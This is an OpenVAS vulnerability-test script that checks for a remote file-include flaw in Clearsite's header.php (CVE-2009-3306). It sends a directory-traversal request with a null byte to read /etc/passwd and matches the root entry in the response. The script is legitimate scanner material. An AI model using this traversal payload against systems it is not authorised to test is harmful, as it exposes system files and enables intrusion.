###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_clearsite_40457.nasl 8457 2018-01-18 07:58:32Z teissa $
#
# Clearsite 'header.php' Remote File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Clearsite is prone to a remote file-include vulnerability because it
fails to sufficiently sanitize user-supplied input.

Exploiting this issue may allow an attacker to compromise the
application and the underlying system; other attacks are also
possible.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100756");
 script_version("$Revision: 8457 $");
 script_tag(name:"last_modification", value:"$Date: 2018-01-18 08:58:32 +0100 (Thu, 18 Jan 2018) $");
 script_tag(name:"creation_date", value:"2010-08-11 13:11:12 +0200 (Wed, 11 Aug 2010)");
 script_bugtraq_id(40457);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-3306");

 script_name("Clearsite 'header.php' Remote File Include Vulnerability");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/40457");
 script_xref(name : "URL" , value : "http://clearsite.sourceforge.net/");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/511507");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("gb_clearsite_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!dir = get_dir_from_kb(port:port, app:"clearsite"))exit(0);
   
url = string(dir, "/include/header.php?cs_base_path=../../../../../../../../../../../../etc/passwd%00"); 

if(http_vuln_check(port:port, url:url,pattern:"root:.*:0:[01]:")) {
     
  security_message(port:port);
  exit(0);

}

exit(0);
